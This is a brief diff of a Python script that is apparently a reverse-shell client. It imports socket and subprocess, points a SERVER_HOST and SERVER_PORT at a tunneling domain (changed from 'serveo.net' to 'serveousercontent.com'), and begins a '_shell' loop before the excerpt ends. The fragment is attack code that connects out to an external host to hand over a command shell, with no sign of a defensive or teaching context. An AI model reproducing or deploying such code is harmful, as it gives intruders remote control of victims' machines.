@@ -1,7 +1,7 @@
 import os, socket, subprocess, threading
 
-SERVER_HOST = "serveo.net"
-SERVER_PORT = 8987
+SERVER_HOST = "serveousercontent.com"
+SERVER_PORT = 37659
 
 def _shell(s):
     while True:
